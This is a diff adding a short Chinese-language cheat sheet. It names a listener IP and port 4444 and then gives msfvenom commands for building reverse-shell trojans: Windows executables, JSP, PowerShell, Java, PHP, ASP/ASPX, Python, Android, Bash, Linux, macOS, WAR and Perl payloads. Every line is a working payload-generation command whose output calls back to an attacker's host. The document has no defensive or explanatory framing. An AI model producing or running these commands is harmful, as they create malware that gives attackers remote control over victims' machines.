@@ -1,0 +1,46 @@
+监听者
+IP：192.168.43.242
+port：4444
+
+生成命令
+exe木马：
+msfvenom -p windows/meterpreter/reverse_tcp lhost=<Your IP> lport=<Your Port> -f exe -o shell.exe -e x86/shikata_ga_nai -i 8
+
+jsp木马：
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP> LPORT=<Your Port> -f raw > shell.jsp
+
+#Powershell木马:
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Your IP> LPORT=<Your Port> -f psh-reflection > shell.psl
+
+#JAVA木马:
+msfvenom -p java/meterpreter/reverse_tcp LHOST=<Your IP> LPORT=<Your Port> -f jar -o shell.jar
+
+#PHP木马:
+msfvenom -p php/meterpreter/reverse_tcp LHOST=<Your IP> LPORT=<Your Port> -f raw -o shell.php
+
+#ASP木马:
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP> LPORT=<Your Port> -f asp > shell.asp
+
+#ASPX木马:
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP> LPORT=<Your Port> -f aspx > shell.aspx
+
+#Python木马:
+msfvenom -p python/meterpreter/reverse_tcp LHOST=<Your IP> LPORT=<Your Port> -f  raw > shell.py
+
+#Android木马:
+msfvenom -p android/meterpreter/reverse_tcp LHOST=<Your IP> LPORT=<Your Port> -o shell.apk
+
+#Bash木马:
+msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP> LPORT=<Your Port> -f raw > shell.sh
+
+#Linux木马：
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP> LPORT=<Your Port> -f elf > shell.elf
+
+#Mac木马：
+msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP> LPORT=<Your Port> -f macho > shell.macho
+
+#WAR木马：
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP> LPORT=<Your Port> -f war > shell.war
+
+#Perl木马：
+msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP LPORT=<Your Port> -f raw > shell.pl
